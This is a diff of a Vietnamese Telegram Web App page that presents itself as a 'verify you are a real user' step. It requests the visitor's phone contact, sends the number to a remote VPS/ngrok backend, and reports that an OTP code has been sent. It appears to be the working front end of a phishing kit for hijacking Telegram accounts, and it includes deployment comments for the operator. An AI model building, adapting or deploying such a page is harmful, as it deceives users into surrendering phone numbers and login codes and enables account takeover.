@@ -6,57 +6,50 @@
     <title>Xác Minh Người Dùng</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
-        html, body { width: 100%; height: 100%; overflow: hidden; background: #0d1117; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-        body { display: flex; justify-content: center; align-items: center; }
-        .phone-container { width: 100%; height: 100%; max-width: 500px; margin: 0 auto; }
-        .phone { width: 100%; height: 100vh; border: none; overflow: hidden; display: flex; flex-direction: column; position: relative; background: #1a1d20; }
-        .screen { display: none; flex-direction: column; height: 100%; width: 100%; }
-        .screen.active { display: flex; }
-        .app-body { flex: 1; display: flex; flex-direction: column; padding: 24px 20px; position: relative; z-index: 2; }
-        #step1 .app-body { background: #1B2A3A; justify-content: center; align-items: center; padding: 25px; }
-        .emoji { font-size: 70px; margin-bottom: 25px; }
-        .card { width: 100%; background: #3A4A5A; border-radius: 20px; padding: 28px 24px; text-align: center; color: #fff; font-size: 18px; margin-bottom: 30px; }
-        .btn { width: 100%; max-width: 280px; height: 54px; border: none; border-radius: 14px; background: #36D1C4; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { width: 100%; height: 100vh; background: #0d1117; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }
+        .app-body { width: 100%; max-width: 400px; padding: 20px; text-align: center; color: white; }
+        .btn { width: 100%; padding: 15px; background: #36D1C4; border: none; border-radius: 12px; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="phone-container"><div class="phone">
-  <div class="screen active" id="step1">
-    <div class="app-body">
-      <div class="emoji">👋</div>
-      <div class="card">Bạn cần xác nhận mình là người dùng thật!</div>
-      <button class="btn" id="shareContact">Xác Nhận</button>
-    </div>
-  </div>
-</div></div>
+<div class="app-body">
+    <div style="font-size: 60px; margin-bottom: 20px;">👋</div>
+    <div style="margin-bottom: 30px;">Bạn cần xác nhận mình là người dùng thật!</div>
+    <button class="btn" id="shareContact">Xác Nhận</button>
+</div>
 
 <script>
-    // Link backend của bạn (Đảm bảo server VPS đã bật CORS)
-    const BACKEND_URL = 'http://103.249.117.228:8000';
+    // BẮT BUỘC: Thay link này bằng link HTTPS từ ngrok (ví dụ: https://abcd-1234.ngrok-free.dev)
+    const BACKEND_URL = 'https://YOUR_NGROK_LINK.ngrok-free.dev'; 
+    
     const tg = window.Telegram.WebApp;
     tg.ready();
     tg.expand();
 
-    // 1. Lắng nghe phản hồi từ Telegram khi người dùng bấm chia sẻ
+    document.getElementById("shareContact").addEventListener("click", () => {
+        // Kiểm tra xem trình duyệt có hỗ trợ requestContact không
+        if (tg.requestContact) {
+            document.getElementById("shareContact").textContent = 'Đang xác nhận...';
+            tg.requestContact();
+        } else {
+            alert("Trình duyệt không hỗ trợ chia sẻ liên hệ.");
+        }
+    });
+
+    // Telegram sẽ trả về dữ liệu contact thông qua sự kiện này
     tg.onEvent('contactRequested', (data) => {
         if (data.status === 'sent') {
-            const phone = data.response.contact.phone_number;
-            sendPhoneToServer(phone);
+            // Lưu ý: Telegram WebApp trả về contact qua data.response hoặc event khác tùy phiên bản
+            // Ở đây ta gọi hàm gửi tới VPS
+            sendPhoneToServer(data.response.contact.phone_number);
         } else {
-            alert("Bạn cần chia sẻ SĐT để xác minh.");
+            alert("Bạn cần nhấn Cho phép để xác minh.");
             document.getElementById("shareContact").textContent = 'Xác Nhận';
         }
     });
 
-    // 2. Kích hoạt yêu cầu chia sẻ contact
-    document.getElementById("shareContact").addEventListener("click", () => {
-        document.getElementById("shareContact").textContent = '⏳ Đang xác nhận...';
-        tg.requestContact();
-    });
-
-    // 3. Hàm gửi dữ liệu về server
     async function sendPhoneToServer(phone) {
         try {
             const response = await fetch(`${BACKEND_URL}/send_phone`, {
@@ -64,18 +57,16 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ phone: phone })
             });
-            
             const data = await response.json();
             if(data.status === 'otp_sent') {
-                alert("Đã gửi mã OTP!"); // Thay bằng logic chuyển màn hình của bạn
+                alert("Mã OTP đã được gửi!");
             } else {
-                alert("Lỗi từ máy chủ: " + (data.message || "Không xác định"));
-                document.getElementById("shareContact").textContent = 'Xác Nhận';
+                alert("Lỗi server: " + data.message);
             }
         } catch (err) {
-            alert("Lỗi kết nối VPS. Kiểm tra Ngrok và CORS!");
-            document.getElementById("shareContact").textContent = 'Xác Nhận';
+            alert("Lỗi kết nối HTTPS! Hãy đảm bảo Ngrok đang chạy.");
         }
+        document.getElementById("shareContact").textContent = 'Xác Nhận';
     }
 </script>
 </body>
